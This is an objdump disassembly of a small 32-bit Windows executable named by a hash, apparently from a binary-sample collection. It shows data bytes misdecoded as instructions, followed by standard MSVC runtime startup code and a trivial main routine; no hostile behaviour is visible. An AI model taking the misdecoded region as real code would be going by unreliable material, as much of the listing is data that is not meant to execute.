
1a6955d26907b3c83f10ede259494ff2d68ab210e1090cb6806e05d1dca36869.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	inc    eax
  401005:	adc    al,0x40
	...
  40100f:	add    BYTE PTR [eax+0x13],dh
  401012:	inc    eax
  401013:	add    BYTE PTR [eax+0x17],al
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax+0x13],dh
  40101e:	add    BYTE PTR [eax],al
  401020:	inc    eax
  401021:	adc    al,0x0
  401023:	add    al,al
  401025:	push   ss
  401026:	add    BYTE PTR [eax],al
  401028:	rcl    BYTE PTR [esi],1
  40102a:	add    BYTE PTR [eax],al
  40102c:	lock push ss
  40102e:	add    BYTE PTR [eax],al
  401030:	inc    eax
  401031:	pop    ss
  401032:	add    BYTE PTR [eax],al
  401034:	and    BYTE PTR [eax],bl
  401036:	add    BYTE PTR [eax],al
  401038:	mov    al,0x1a
  40103a:	add    BYTE PTR [eax],al
  40103c:	loopne 0x401058
  40103e:	add    BYTE PTR [eax],al
  401040:	inc    eax
  401041:	and    BYTE PTR [eax+0x0],al
  401044:	nop
  401045:	and    BYTE PTR [eax+0x0],al
  401048:	inc    eax
  401049:	add    BYTE PTR [ebx+0x0],dh
  40104c:	jns    0x40104e
  40104e:	jae    0x401050
  401050:	add    BYTE PTR fs:[ebp+0x0],ch
  401054:	add    BYTE PTR cs:[ebx+0x0],ah
  401058:	jo     0x40105a
  40105a:	ins    BYTE PTR es:[edi],dx
  40105b:	add    BYTE PTR [eax+eax*1],ch
  40105e:	xor    al,BYTE PTR [eax]
  401060:	xor    BYTE PTR [eax],al
  401062:	xor    eax,0x0
	...
  401073:	add    BYTE PTR [edx+0x3c],cl
  401076:	lahf   
  401077:	push   ebp
  401078:	add    BYTE PTR [eax],al
  40107a:	add    BYTE PTR [eax],al
  40107c:	add    al,BYTE PTR [eax]
  40107e:	add    BYTE PTR [eax],al
  401080:	cmp    DWORD PTR [eax],eax
  401082:	add    BYTE PTR [eax],al
  401084:	xor    al,0x11
  401086:	add    BYTE PTR [eax],al
  401088:	xor    al,0x5
  40108a:	add    BYTE PTR [eax],al
  40108c:	add    BYTE PTR [eax],al
  40108e:	add    BYTE PTR [eax],al
  401090:	dec    edx
  401091:	cmp    al,0x9f
  401093:	push   ebp
  401094:	add    BYTE PTR [eax],al
  401096:	add    BYTE PTR [eax],al
  401098:	or     eax,0xc8000000
  40109d:	add    DWORD PTR [eax],eax
  40109f:	add    BYTE PTR [ecx+edx*1+0x5840000],al
	...
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	push   0x0
	...
  401101:	add    BYTE PTR [eax],al
  401103:	add    BYTE PTR [eax+eiz*1],al
  401106:	inc    eax
  401107:	add    BYTE PTR [eax],dh
  401109:	adc    DWORD PTR [eax+0x0],eax
  40110c:	add    DWORD PTR [eax],eax
  40110e:	add    BYTE PTR [eax],al
  401110:	nop
  401111:	xor    BYTE PTR [eax+0x0],al
  401114:	add    BYTE PTR [eax],al
  401116:	add    BYTE PTR [eax],al
  401118:	sbb    al,0x10
  40111a:	inc    eax
  40111b:	add    BYTE PTR [ecx],cl
  40111d:	add    BYTE PTR [eax],al
  40111f:	add    BYTE PTR [eax],al
  401121:	xor    eax,0x0
	...
  40112e:	add    BYTE PTR [eax],al
  401130:	mov    al,0x1a
  401132:	add    BYTE PTR [eax],al
  401134:	push   edx
  401135:	push   ebx
  401136:	inc    esp
  401137:	push   ebx
  401138:	sbb    BYTE PTR [edi],dh
  40113a:	call   0xa041:0xcd2d07dd
  401141:	xchg   ecx,eax
  401142:	fdiv   DWORD PTR [ebp-0x663a746d]
  401148:	add    DWORD PTR [eax],eax
  40114a:	add    BYTE PTR [eax],al
  40114c:	push   ebx
  40114d:	jns    0x4011c2
  40114f:	je     0x4011b6
  401151:	ins    DWORD PTR es:[edi],dx
  401152:	push   eax
  401153:	jb     0x4011c4
  401155:	jo     0x4011bc
  401157:	jb     0x4011cd
  401159:	imul   esp,DWORD PTR [ebp+0x73],0x706d6f43
  401160:	jne    0x4011d6
  401162:	gs jb  0x4011b3
  401165:	popa   
  401166:	ins    DWORD PTR es:[edi],dx
  401167:	gs cs jo 0x4011cf
  40116b:	bound  eax,QWORD PTR [eax]
	...
  401181:	add    BYTE PTR [eax],al
  401183:	add    BYTE PTR [edi+0x43],al
  401186:	push   esp
  401187:	dec    esp
  401188:	add    BYTE PTR [eax],dl
  40118a:	add    BYTE PTR [eax],al
  40118c:	add    al,0x0
  40118e:	add    BYTE PTR [eax],al
  401190:	cs inc ebx
  401192:	push   edx
  401193:	push   esp
  401194:	and    al,0x58
  401196:	inc    ebx
  401197:	inc    ecx
  401198:	add    BYTE PTR [eax],al
  40119a:	add    BYTE PTR [eax],al
  40119c:	add    al,0x10
  40119e:	add    BYTE PTR [eax],al
  4011a0:	add    al,0x0
  4011a2:	add    BYTE PTR [eax],al
  4011a4:	cs inc ebx
  4011a6:	push   edx
  4011a7:	push   esp
  4011a8:	and    al,0x58
  4011aa:	inc    ebx
  4011ab:	inc    ecx
  4011ac:	inc    ecx
  4011ad:	add    BYTE PTR [eax],al
  4011af:	add    BYTE PTR [eax],cl
  4011b1:	adc    BYTE PTR [eax],al
  4011b3:	add    BYTE PTR [eax+eax*1],al
  4011b6:	add    BYTE PTR [eax],al
  4011b8:	cs inc ebx
  4011ba:	push   edx
  4011bb:	push   esp
  4011bc:	and    al,0x58
  4011be:	inc    ebx
  4011bf:	pop    edx
  4011c0:	add    BYTE PTR [eax],al
  4011c2:	add    BYTE PTR [eax],al
  4011c4:	or     al,0x10
  4011c6:	add    BYTE PTR [eax],al
  4011c8:	add    al,0x0
  4011ca:	add    BYTE PTR [eax],al
  4011cc:	cs inc ebx
  4011ce:	push   edx
  4011cf:	push   esp
  4011d0:	and    al,0x58
  4011d2:	dec    ecx
  4011d3:	inc    ecx
  4011d4:	add    BYTE PTR [eax],al
  4011d6:	add    BYTE PTR [eax],al
  4011d8:	adc    BYTE PTR [eax],dl
  4011da:	add    BYTE PTR [eax],al
  4011dc:	add    al,0x0
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cs inc ebx
  4011e2:	push   edx
  4011e3:	push   esp
  4011e4:	and    al,0x58
  4011e6:	dec    ecx
  4011e7:	inc    ecx
  4011e8:	inc    ecx
  4011e9:	add    BYTE PTR [eax],al
  4011eb:	add    BYTE PTR [eax+edx*1],dl
  4011ee:	add    BYTE PTR [eax],al
  4011f0:	add    al,0x0
  4011f2:	add    BYTE PTR [eax],al
  4011f4:	cs inc ebx
  4011f6:	push   edx
  4011f7:	push   esp
  4011f8:	and    al,0x58
  4011fa:	dec    ecx
  4011fb:	pop    ecx
  4011fc:	add    BYTE PTR [eax],al
  4011fe:	add    BYTE PTR [eax],al
  401200:	sbb    BYTE PTR [eax],dl
  401202:	add    BYTE PTR [eax],al
  401204:	add    al,0x0
  401206:	add    BYTE PTR [eax],al
  401208:	cs inc ebx
  40120a:	push   edx
  40120b:	push   esp
  40120c:	and    al,0x58
  40120e:	dec    ecx
  40120f:	pop    edx
  401210:	add    BYTE PTR [eax],al
  401212:	add    BYTE PTR [eax],al
  401214:	sbb    al,0x10
  401216:	add    BYTE PTR [eax],al
  401218:	and    al,0x0
  40121a:	add    BYTE PTR [eax],al
  40121c:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  401224:	add    BYTE PTR [eax],al
  401226:	add    BYTE PTR [eax],al
  401228:	inc    eax
  401229:	adc    BYTE PTR [eax],al
  40122b:	add    al,dh
  40122d:	add    BYTE PTR [eax],al
  40122f:	add    BYTE PTR [esi],ch
  401231:	jb     0x401297
  401233:	popa   
  401234:	je     0x401297
  401236:	add    BYTE PTR [eax],al
  401238:	xor    BYTE PTR [ecx],dl
  40123a:	add    BYTE PTR [eax],al
  40123c:	add    al,0x0
  40123e:	add    BYTE PTR [eax],al
  401240:	cs jb  0x4012a7
  401243:	popa   
  401244:	je     0x4012a7
  401246:	and    al,0x73
  401248:	js     0x4012ae
  40124a:	popa   
  40124b:	je     0x4012ae
  40124d:	add    BYTE PTR [eax],al
  40124f:	add    BYTE PTR [ecx+edx*1],dh
  401252:	add    BYTE PTR [eax],al
  401254:	sbb    BYTE PTR [edx],al
  401256:	add    BYTE PTR [eax],al
  401258:	cs jb  0x4012bf
  40125b:	popa   
  40125c:	je     0x4012bf
  40125e:	and    al,0x7a
  401260:	jp     0x4012dc
  401262:	bound  esp,QWORD PTR fs:[edi+0x0]
  401266:	add    BYTE PTR [eax],al
  401268:	push   eax
  401269:	adc    eax,DWORD PTR [eax]
  40126b:	add    BYTE PTR [eax+0x9],al
  40126e:	add    BYTE PTR [eax],al
  401270:	cs je  0x4012d8
  401273:	js     0x4012e9
  401275:	and    al,0x6d
  401277:	outs   dx,BYTE PTR ds:[esi]
  401278:	add    BYTE PTR [eax],al
  40127a:	add    BYTE PTR [eax],al
  40127c:	nop
  40127d:	sbb    al,0x0
  40127f:	add    BYTE PTR [eax+eax*1+0x0],ah
  401283:	add    BYTE PTR [esi],ch
  401285:	js     0x4012eb
  401287:	popa   
  401288:	je     0x4012eb
  40128a:	and    al,0x78
  40128c:	add    BYTE PTR [eax],al
  40128e:	add    BYTE PTR [eax],al
  401290:	add    BYTE PTR [eax],ah
  401292:	add    BYTE PTR [eax],al
  401294:	or     al,0x0
  401296:	add    BYTE PTR [eax],al
  401298:	cs fs popa 
  40129b:	je     0x4012fe
  40129d:	add    BYTE PTR [eax],al
  40129f:	add    BYTE PTR [eax],dl
  4012a1:	and    BYTE PTR [eax],al
  4012a3:	add    BYTE PTR [eax+0x3],ah
  4012a6:	add    BYTE PTR [eax],al
  4012a8:	bound  esi,QWORD PTR cs:[ebx+0x73]
  4012ac:	add    BYTE PTR [eax],al
  4012ae:	add    BYTE PTR [eax],al
  4012b0:	add    BYTE PTR [eax],dh
  4012b2:	add    BYTE PTR [eax],al
  4012b4:	nop
  4012b5:	add    BYTE PTR [eax],al
  4012b7:	add    BYTE PTR [esi],ch
  4012b9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [eax+0x4000030],dl
  4012c9:	add    BYTE PTR [eax],al
  4012cb:	add    BYTE PTR [esi],ch
  4012cd:	xor    BYTE PTR [eax],dh
  4012cf:	arpl   WORD PTR [esi+0x67],sp
  4012d2:	add    BYTE PTR [eax],al
  4012d4:	xchg   esp,eax
  4012d5:	xor    BYTE PTR [eax],al
  4012d7:	add    BYTE PTR [eax+0x2e000000],ah
  4012dd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  4012e5:	add    BYTE PTR [eax],al
  4012e7:	add    BYTE PTR [ecx+esi*1],dh
  4012ea:	add    BYTE PTR [eax],al
  4012ec:	adc    al,0x0
  4012ee:	add    BYTE PTR [eax],al
  4012f0:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  4012f9:	add    BYTE PTR [eax],al
  4012fb:	add    BYTE PTR [eax+0x31],cl
  4012fe:	add    BYTE PTR [eax],al
  401300:	nop
  401301:	add    BYTE PTR [eax],al
  401303:	add    BYTE PTR [esi],ch
  401305:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  40130d:	add    BYTE PTR [eax],al
  40130f:	add    al,bl
  401311:	xor    DWORD PTR [eax],eax
  401313:	add    dh,ch
  401315:	add    al,BYTE PTR [eax]
  401317:	add    BYTE PTR [esi],ch
  401319:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  401321:	add    BYTE PTR [eax],al
  401323:	add    BYTE PTR [eax],al
  401325:	inc    eax
  401326:	add    BYTE PTR [eax],al
  401328:	xor    BYTE PTR [ebx],al
  40132a:	add    BYTE PTR [eax],al
  40132c:	cs jb  0x4013a2
  40132f:	jb     0x401394
  401331:	and    al,0x30
  401333:	xor    DWORD PTR [eax],eax
  401335:	add    BYTE PTR [eax],al
  401337:	add    BYTE PTR [eax],dh
  401339:	inc    ebx
  40133a:	add    BYTE PTR [eax],al
  40133c:	adc    BYTE PTR [ecx+eax*1],ah
  40133f:	add    BYTE PTR [esi],ch
  401341:	jb     0x4013b6
  401343:	jb     0x4013a8
  401345:	and    al,0x30
  401347:	xor    al,BYTE PTR [eax]
	...
  401355:	push   0x401048
  40135a:	call   DWORD PTR ds:0x403000
  401360:	xor    eax,eax
  401362:	ret    0x10
  401365:	int3   
  401366:	int3   
  401367:	int3   
  401368:	int3   
  401369:	int3   
  40136a:	int3   
  40136b:	int3   
  40136c:	int3   
  40136d:	int3   
  40136e:	int3   
  40136f:	int3   
  401370:	mov    eax,0x5a4d
  401375:	cmp    WORD PTR ds:0x400000,ax
  40137c:	je     0x401382
  40137e:	xor    eax,eax
  401380:	jmp    0x4013d0
  401382:	mov    ecx,DWORD PTR ds:0x40003c
  401388:	cmp    DWORD PTR [ecx+0x400000],0x4550
  401392:	jne    0x40137e
  401394:	movzx  eax,WORD PTR [ecx+0x400018]
  40139b:	cmp    eax,0x10b
  4013a0:	je     0x4013bc
  4013a2:	cmp    eax,0x20b
  4013a7:	jne    0x40137e
  4013a9:	xor    eax,eax
  4013ab:	cmp    DWORD PTR [ecx+0x400084],0xe
  4013b2:	jbe    0x4013d0
  4013b4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  4013ba:	jmp    0x4013cd
  4013bc:	xor    eax,eax
  4013be:	cmp    DWORD PTR [ecx+0x400074],0xe
  4013c5:	jbe    0x4013d0
  4013c7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  4013cd:	setne  al
  4013d0:	push   0x2
  4013d2:	mov    ds:0x402028,eax
  4013d7:	call   0x4017ce
  4013dc:	push   eax
  4013dd:	call   DWORD PTR ds:0x403078
  4013e3:	or     DWORD PTR ds:0x40235c,0xffffffff
  4013ea:	or     DWORD PTR ds:0x402360,0xffffffff
  4013f1:	pop    ecx
  4013f2:	pop    ecx
  4013f3:	call   DWORD PTR ds:0x403068
  4013f9:	mov    ecx,DWORD PTR ds:0x40203c
  4013ff:	mov    DWORD PTR [eax],ecx
  401401:	call   DWORD PTR ds:0x403084
  401407:	mov    ecx,DWORD PTR ds:0x402030
  40140d:	mov    DWORD PTR [eax],ecx
  40140f:	call   0x401820
  401414:	cmp    DWORD PTR ds:0x402000,0x0
  40141b:	jne    0x401429
  40141d:	push   0x401820
  401422:	call   DWORD PTR ds:0x403064
  401428:	pop    ecx
  401429:	call   0x401a2f
  40142e:	xor    eax,eax
  401430:	ret    
  401431:	int3   
  401432:	int3   
  401433:	int3   
  401434:	int3   
  401435:	int3   
  401436:	int3   
  401437:	int3   
  401438:	int3   
  401439:	int3   
  40143a:	int3   
  40143b:	int3   
  40143c:	int3   
  40143d:	int3   
  40143e:	int3   
  40143f:	int3   
  401440:	mov    eax,ds:0x402038
  401445:	push   0x40202c
  40144a:	push   DWORD PTR ds:0x402034
  401450:	mov    ds:0x40202c,eax
  401455:	push   0x402020
  40145a:	push   0x40201c
  40145f:	push   0x402018
  401464:	call   DWORD PTR ds:0x40307c
  40146a:	add    esp,0x14
  40146d:	mov    ds:0x402024,eax
  401472:	ret    
  401473:	int3   
  401474:	int3   
  401475:	int3   
  401476:	int3   
  401477:	int3   
  401478:	push   0x5c
  40147a:	push   0x401c90
  40147f:	call   0x401a54
  401484:	and    DWORD PTR [ebp-0x24],0x0
  401488:	and    DWORD PTR [ebp-0x4],0x0
  40148c:	lea    eax,[ebp-0x6c]
  40148f:	push   eax
  401490:	call   DWORD PTR ds:0x40301c
  401496:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40149d:	xor    ebx,ebx
  40149f:	inc    ebx
  4014a0:	mov    DWORD PTR [ebp-0x4],ebx
  4014a3:	mov    eax,fs:0x18
  4014a9:	mov    edi,DWORD PTR [eax+0x4]
  4014ac:	xor    esi,esi
  4014ae:	mov    edx,0x402364
  4014b3:	mov    ecx,edi
  4014b5:	xor    eax,eax
  4014b7:	lock cmpxchg DWORD PTR [edx],ecx
  4014bb:	test   eax,eax
  4014bd:	je     0x4014c5
  4014bf:	cmp    eax,edi
  4014c1:	jne    0x4014d7
  4014c3:	mov    esi,ebx
  4014c5:	cmp    DWORD PTR ds:0x402368,ebx
  4014cb:	jne    0x4014e4
  4014cd:	push   0x1f
  4014cf:	call   0x40180a
  4014d4:	pop    ecx
  4014d5:	jmp    0x401513
  4014d7:	push   0x3e8
  4014dc:	call   DWORD PTR ds:0x40303c
  4014e2:	jmp    0x4014ae
  4014e4:	cmp    DWORD PTR ds:0x402368,0x0
  4014eb:	jne    0x40150d
  4014ed:	mov    DWORD PTR ds:0x402368,ebx
  4014f3:	push   0x401018
  4014f8:	push   0x40100c
  4014fd:	call   0x401664
  401502:	pop    ecx
  401503:	pop    ecx
  401504:	test   eax,eax
  401506:	je     0x401513
  401508:	jmp    0x40164d
  40150d:	mov    DWORD PTR ds:0x402014,ebx
  401513:	cmp    DWORD PTR ds:0x402368,ebx
  401519:	jne    0x401536
  40151b:	push   0x401008
  401520:	push   0x401000
  401525:	call   0x401a48
  40152a:	pop    ecx
  40152b:	pop    ecx
  40152c:	mov    DWORD PTR ds:0x402368,0x2
  401536:	test   esi,esi
  401538:	jne    0x401543
  40153a:	xor    eax,eax
  40153c:	mov    ecx,0x402364
  401541:	xchg   DWORD PTR [ecx],eax
  401543:	cmp    DWORD PTR ds:0x40236c,0x0
  40154a:	je     0x401571
  40154c:	push   0x40236c
  401551:	call   0x401880
  401556:	pop    ecx
  401557:	test   eax,eax
  401559:	je     0x401571
  40155b:	push   0x0
  40155d:	push   0x2
  40155f:	push   0x0
  401561:	mov    esi,DWORD PTR ds:0x40236c
  401567:	mov    ecx,esi
  401569:	call   DWORD PTR ds:0x403090
  40156f:	call   esi
  401571:	mov    eax,ds:0x40305c
  401576:	mov    ecx,DWORD PTR [eax]
  401578:	test   ecx,ecx
  40157a:	je     0x40164d
  401580:	mov    DWORD PTR [ebp-0x20],ecx
  401583:	push   0x20
  401585:	pop    esi
  401586:	mov    edx,DWORD PTR [ebp-0x24]
  401589:	movzx  eax,WORD PTR [ecx]
  40158c:	cmp    ax,si
  40158f:	ja     0x4015e1
  401591:	test   ax,ax
  401594:	je     0x40159a
  401596:	test   edx,edx
  401598:	jne    0x4015e1
  40159a:	movzx  eax,WORD PTR [ecx]
  40159d:	test   ax,ax
  4015a0:	je     0x4015af
  4015a2:	cmp    ax,si
  4015a5:	ja     0x4015af
  4015a7:	add    ecx,0x2
  4015aa:	mov    DWORD PTR [ebp-0x20],ecx
  4015ad:	jmp    0x40159a
  4015af:	test   BYTE PTR [ebp-0x40],0x1
  4015b3:	je     0x4015bb
  4015b5:	movzx  eax,WORD PTR [ebp-0x3c]
  4015b9:	jmp    0x4015be
  4015bb:	push   0xa
  4015bd:	pop    eax
  4015be:	push   eax
  4015bf:	push   ecx
  4015c0:	push   0x0
  4015c2:	push   0x400000
  4015c7:	call   0x401355
  4015cc:	mov    ds:0x402010,eax
  4015d1:	cmp    DWORD PTR ds:0x402028,0x0
  4015d8:	jne    0x401629
  4015da:	push   eax
  4015db:	call   DWORD PTR ds:0x403074
  4015e1:	cmp    eax,0x22
  4015e4:	jne    0x4015f2
  4015e6:	xor    eax,eax
  4015e8:	test   edx,edx
  4015ea:	sete   al
  4015ed:	mov    edx,eax
  4015ef:	mov    DWORD PTR [ebp-0x24],edx
  4015f2:	add    ecx,0x2
  4015f5:	mov    DWORD PTR [ebp-0x20],ecx
  4015f8:	jmp    0x401589
  4015fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4015fd:	mov    eax,DWORD PTR [ecx]
  4015ff:	mov    eax,DWORD PTR [eax]
  401601:	mov    DWORD PTR [ebp-0x28],eax
  401604:	push   ecx
  401605:	push   eax
  401606:	call   0x401754
  40160b:	pop    ecx
  40160c:	pop    ecx
  40160d:	ret    
  40160e:	mov    esp,DWORD PTR [ebp-0x18]
  401611:	mov    eax,DWORD PTR [ebp-0x28]
  401614:	mov    ds:0x402010,eax
  401619:	cmp    DWORD PTR ds:0x402028,0x0
  401620:	jne    0x401629
  401622:	push   eax
  401623:	call   DWORD PTR ds:0x403070
  401629:	cmp    DWORD PTR ds:0x402014,0x0
  401630:	jne    0x40163d
  401632:	call   DWORD PTR ds:0x40306c
  401638:	mov    eax,ds:0x402010
  40163d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401644:	jmp    0x401659
  401646:	xor    eax,eax
  401648:	inc    eax
  401649:	ret    
  40164a:	mov    esp,DWORD PTR [ebp-0x18]
  40164d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401654:	mov    eax,0xff
  401659:	call   0x401a9c
  40165e:	ret    
  40165f:	int3   
  401660:	int3   
  401661:	int3   
  401662:	int3   
  401663:	int3   
  401664:	mov    edi,edi
  401666:	push   ebp
  401667:	mov    ebp,esp
  401669:	push   ecx
  40166a:	mov    eax,ds:0x402004
  40166f:	xor    eax,ebp
  401671:	mov    DWORD PTR [ebp-0x4],eax
  401674:	push   esi
  401675:	mov    esi,DWORD PTR [ebp+0x8]
  401678:	xor    eax,eax
  40167a:	cmp    esi,DWORD PTR [ebp+0xc]
  40167d:	jae    0x40169d
  40167f:	push   edi
  401680:	test   eax,eax
  401682:	jne    0x40169c
  401684:	mov    edi,DWORD PTR [esi]
  401686:	test   edi,edi
  401688:	je     0x401694
  40168a:	mov    ecx,edi
  40168c:	call   DWORD PTR ds:0x403090
  401692:	call   edi
  401694:	add    esi,0x4
  401697:	cmp    esi,DWORD PTR [ebp+0xc]
  40169a:	jb     0x401680
  40169c:	pop    edi
  40169d:	mov    ecx,DWORD PTR [ebp-0x4]
  4016a0:	xor    ecx,ebp
  4016a2:	pop    esi
  4016a3:	call   0x4016d0
  4016a8:	mov    esp,ebp
  4016aa:	pop    ebp
  4016ab:	ret    
  4016ac:	int3   
  4016ad:	int3   
  4016ae:	int3   
  4016af:	int3   
  4016b0:	int3   
  4016b1:	int3   
  4016b2:	int3   
  4016b3:	int3   
  4016b4:	int3   
  4016b5:	int3   
  4016b6:	int3   
  4016b7:	int3   
  4016b8:	int3   
  4016b9:	int3   
  4016ba:	int3   
  4016bb:	int3   
  4016bc:	int3   
  4016bd:	int3   
  4016be:	int3   
  4016bf:	int3   
  4016c0:	call   0x401988
  4016c5:	jmp    0x401478
  4016ca:	int3   
  4016cb:	int3   
  4016cc:	int3   
  4016cd:	int3   
  4016ce:	int3   
  4016cf:	int3   
  4016d0:	cmp    ecx,DWORD PTR ds:0x402004
  4016d6:	jne    0x4016db
  4016d8:	ret    0x0
  4016db:	jmp    0x401b15
  4016e0:	int3   
  4016e1:	int3   
  4016e2:	int3   
  4016e3:	int3   
  4016e4:	int3   
  4016e5:	int3   
  4016e6:	int3   
  4016e7:	int3   
  4016e8:	int3   
  4016e9:	int3   
  4016ea:	int3   
  4016eb:	int3   
  4016ec:	int3   
  4016ed:	int3   
  4016ee:	int3   
  4016ef:	int3   
  4016f0:	mov    edi,edi
  4016f2:	push   ebp
  4016f3:	mov    ebp,esp
  4016f5:	mov    eax,DWORD PTR [ebp+0x8]
  4016f8:	mov    eax,DWORD PTR [eax]
  4016fa:	cmp    DWORD PTR [eax],0xe06d7363
  401700:	jne    0x40172d
  401702:	cmp    DWORD PTR [eax+0x10],0x3
  401706:	jne    0x40172d
  401708:	mov    eax,DWORD PTR [eax+0x14]
  40170b:	cmp    eax,0x19930520
  401710:	je     0x401727
  401712:	cmp    eax,0x19930521
  401717:	je     0x401727
  401719:	cmp    eax,0x19930522
  40171e:	je     0x401727
  401720:	cmp    eax,0x1994000
  401725:	jne    0x40172d
  401727:	call   DWORD PTR ds:0x403058
  40172d:	xor    eax,eax
  40172f:	pop    ebp
  401730:	ret    0x4
  401733:	int3   
  401734:	int3   
  401735:	int3   
  401736:	int3   
  401737:	int3   
  401738:	int3   
  401739:	int3   
  40173a:	int3   
  40173b:	int3   
  40173c:	int3   
  40173d:	int3   
  40173e:	int3   
  40173f:	int3   
  401740:	push   0x4016f0
  401745:	call   DWORD PTR ds:0x40300c
  40174b:	xor    eax,eax
  40174d:	ret    
  40174e:	int3   
  40174f:	int3   
  401750:	int3   
  401751:	int3   
  401752:	int3   
  401753:	int3   
  401754:	jmp    DWORD PTR ds:0x403088
  40175a:	int3   
  40175b:	int3   
  40175c:	int3   
  40175d:	int3   
  40175e:	int3   
  40175f:	push   0xc
  401761:	push   0x401cb8
  401766:	call   0x401c2c
  40176b:	xor    ecx,ecx
  40176d:	mov    eax,DWORD PTR [ebp+0x8]
  401770:	test   eax,eax
  401772:	je     0x4017bf
  401774:	cmp    eax,0xffffffff
  401777:	je     0x4017bf
  401779:	mov    DWORD PTR [ebp-0x4],ecx
  40177c:	mov    edx,0x5a4d
  401781:	cmp    WORD PTR [eax],dx
  401784:	jne    0x4017b8
  401786:	mov    edx,DWORD PTR [eax+0x3c]
  401789:	test   edx,edx
  40178b:	js     0x4017b8
  40178d:	cmp    edx,0x10000000
  401793:	jae    0x4017b8
  401795:	add    eax,edx
  401797:	mov    DWORD PTR [ebp-0x1c],eax
  40179a:	mov    ecx,DWORD PTR [eax]
  40179c:	sub    ecx,0x4550
  4017a2:	neg    ecx
  4017a4:	sbb    ecx,ecx
  4017a6:	not    ecx
  4017a8:	and    ecx,eax
  4017aa:	jmp    0x4017b5
  4017ac:	xor    eax,eax
  4017ae:	inc    eax
  4017af:	ret    
  4017b0:	mov    esp,DWORD PTR [ebp-0x18]
  4017b3:	xor    ecx,ecx
  4017b5:	mov    DWORD PTR [ebp-0x1c],ecx
  4017b8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4017bf:	mov    eax,ecx
  4017c1:	call   0x401c71
  4017c6:	ret    0x4
  4017c9:	int3   
  4017ca:	int3   
  4017cb:	int3   
  4017cc:	int3   
  4017cd:	int3   
  4017ce:	mov    edi,edi
  4017d0:	push   ebp
  4017d1:	mov    ebp,esp
  4017d3:	push   0x0
  4017d5:	call   DWORD PTR ds:0x403014
  4017db:	test   eax,eax
  4017dd:	je     0x4017ff
  4017df:	push   eax
  4017e0:	call   0x40175f
  4017e5:	test   eax,eax
  4017e7:	je     0x4017ff
  4017e9:	movzx  ecx,WORD PTR [eax+0x5c]
  4017ed:	push   0x2
  4017ef:	pop    eax
  4017f0:	cmp    cx,ax
  4017f3:	je     0x401802
  4017f5:	cmp    ecx,0x3
  4017f8:	jne    0x4017ff
  4017fa:	xor    eax,eax
  4017fc:	inc    eax
  4017fd:	pop    ebp
  4017fe:	ret    
  4017ff:	mov    eax,DWORD PTR [ebp+0x8]
  401802:	pop    ebp
  401803:	ret    
  401804:	int3   
  401805:	int3   
  401806:	int3   
  401807:	int3   
  401808:	int3   
  401809:	int3   
  40180a:	jmp    DWORD PTR ds:0x403080
  401810:	int3   
  401811:	int3   
  401812:	int3   
  401813:	int3   
  401814:	int3   
  401815:	int3   
  401816:	int3   
  401817:	int3   
  401818:	int3   
  401819:	int3   
  40181a:	int3   
  40181b:	int3   
  40181c:	int3   
  40181d:	int3   
  40181e:	int3   
  40181f:	int3   
  401820:	xor    eax,eax
  401822:	ret    
  401823:	int3   
  401824:	int3   
  401825:	int3   
  401826:	int3   
  401827:	int3   
  401828:	int3   
  401829:	int3   
  40182a:	int3   
  40182b:	int3   
  40182c:	int3   
  40182d:	int3   
  40182e:	int3   
  40182f:	int3   
  401830:	mov    edi,edi
  401832:	push   ebp
  401833:	mov    ebp,esp
  401835:	mov    eax,DWORD PTR [ebp+0x8]
  401838:	xor    edx,edx
  40183a:	push   ebx
  40183b:	push   esi
  40183c:	push   edi
  40183d:	mov    ecx,DWORD PTR [eax+0x3c]
  401840:	add    ecx,eax
  401842:	movzx  eax,WORD PTR [ecx+0x14]
  401846:	movzx  ebx,WORD PTR [ecx+0x6]
  40184a:	add    eax,0x18
  40184d:	add    eax,ecx
  40184f:	test   ebx,ebx
  401851:	je     0x40186e
  401853:	mov    edi,DWORD PTR [ebp+0xc]
  401856:	mov    esi,DWORD PTR [eax+0xc]
  401859:	cmp    edi,esi
  40185b:	jb     0x401866
  40185d:	mov    ecx,DWORD PTR [eax+0x8]
  401860:	add    ecx,esi
  401862:	cmp    edi,ecx
  401864:	jb     0x401870
  401866:	inc    edx
  401867:	add    eax,0x28
  40186a:	cmp    edx,ebx
  40186c:	jb     0x401856
  40186e:	xor    eax,eax
  401870:	pop    edi
  401871:	pop    esi
  401872:	pop    ebx
  401873:	pop    ebp
  401874:	ret    
  401875:	int3   
  401876:	int3   
  401877:	int3   
  401878:	int3   
  401879:	int3   
  40187a:	int3   
  40187b:	int3   
  40187c:	int3   
  40187d:	int3   
  40187e:	int3   
  40187f:	int3   
  401880:	mov    edi,edi
  401882:	push   ebp
  401883:	mov    ebp,esp
  401885:	push   0xfffffffe
  401887:	push   0x401cd8
  40188c:	push   0x401ab0
  401891:	mov    eax,fs:0x0
  401897:	push   eax
  401898:	sub    esp,0x8
  40189b:	push   ebx
  40189c:	push   esi
  40189d:	push   edi
  40189e:	mov    eax,ds:0x402004
  4018a3:	xor    DWORD PTR [ebp-0x8],eax
  4018a6:	xor    eax,ebp
  4018a8:	push   eax
  4018a9:	lea    eax,[ebp-0x10]
  4018ac:	mov    fs:0x0,eax
  4018b2:	mov    DWORD PTR [ebp-0x18],esp
  4018b5:	mov    DWORD PTR [ebp-0x4],0x0
  4018bc:	push   0x400000
  4018c1:	call   0x401950
  4018c6:	add    esp,0x4
  4018c9:	test   eax,eax
  4018cb:	je     0x401921
  4018cd:	mov    eax,DWORD PTR [ebp+0x8]
